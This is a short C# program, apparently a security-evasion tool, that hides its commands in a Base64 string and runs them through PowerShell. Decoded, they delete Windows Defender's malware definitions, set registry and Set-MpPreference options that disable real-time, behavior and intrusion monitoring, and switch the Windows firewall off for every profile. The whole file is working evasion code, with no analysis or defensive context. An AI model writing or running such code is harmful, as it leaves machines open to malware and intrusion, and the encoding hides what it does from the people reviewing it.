using System;
using System.Text;
using System.Management.Automation;
using System.Management.Automation.Runspaces;

namespace disableDefender

{
    internal class Program
    {
        static void Main(string[] args)
        {
            Runspace rs = RunspaceFactory.CreateRunspace();
            rs.Open();
            string encodedCommand = "YwBtAGQALgBlAHgAZQAgAC8AYwAgACIAQwA6AFwAUAByAG8AZwByAGEAbQAgAEYAaQBsAGUAcwBcAFcAaQBuAGQAbwB3AHMAIABEAGUAZgBlAG4AZABlAHIAXABNAHAAQwBtAGQAUgB1AG4ALgBlAHgAZQAiACAALQByAGUAbQBvAHYAZQBkAGUAZgBpAG4AaQB0AGkAbwBuAHMAIAAtAGEAbABsAAoAUgBFAEcAIABBAEQARAAgACIASABLAEwATQBcAFMATwBGAFQAVwBBAFIARQBcAFAAbwBsAGkAYwBpAGUAcwBcAE0AaQBjAHIAbwBzAG8AZgB0AFwAVwBpAG4AZABvAHcAcwAgAEQAZQBmAGUAbgBkAGUAcgAiACAALwB2ACAAIgBEAGkAcwBhAGIAbABlAFIAZQBhAGwAdABpAG0AZQBNAG8AbgBpAHQAbwByAGkAbgBnACIAIAAvAHQAIABSAEUARwBfAEQAVwBPAFIARAAgAC8AZAAgADEAIAAvAGYACgBSAEUARwAgAEEARABEACAAIgBIAEsATABNAFwAUwBPAEYAVABXAEEAUgBFAFwAUABvAGwAaQBjAGkAZQBzAFwATQBpAGMAcgBvAHMAbwBmAHQAXABXAGkAbgBkAG8AdwBzACAARABlAGYAZQBuAGQAZQByACIAIAAvAHYAIAAiAEQAaQBzAGEAYgBsAGUAQgBlAGgAYQB2AGkAbwByAE0AbwBuAGkAdABvAHIAaQBuAGcAIgAgAC8AdAAgAFIARQBHAF8ARABXAE8AUgBEACAALwBkACAAMQAgAC8AZgAKAHAAbwB3AGUAcgBzAGgAZQBsAGwAIABTAGUAdAAtAE0AcABQAHIAZQBmAGUAcgBlAG4AYwBlACAALQBEAGkAcwBhAGIAbABlAEkAbgB0AHIAdQBzAGkAbwBuAFAAcgBlAHYAZQBuAHQAaQBvAG4AUwB5AHMAdABlAG0AIAAxACAALQBEAGkAcwBhAGIAbABlAEkATwBBAFYAUAByAG8AdABlAGMAdABpAG8AbgAgADEAIAAtAEQAaQBzAGEAYgBsAGUAUgBlAGEAbAB0AGkAbQBlAE0AbwBuAGkAdABvAHIAaQBuAGcAIAAxAAoATgBlAHQAUwBoACAAQQBkAHYAZgBpAHIAZQB3AGEAbABsACAAcwBlAHQAIABhAGwAbABwAHIAbwBmAGkAbABlAHMAIABzAHQAYQB0AGUAIABvAGYAZgA=";
            PowerShell ps = PowerShell.Create();
            ps.Runspace = rs;
            string decodedshellCmd = Encoding.Unicode.GetString(Convert.FromBase64String(encodedCommand));
            ps.AddScript(decodedshellCmd);
            ps.Invoke();
        }
    }
}
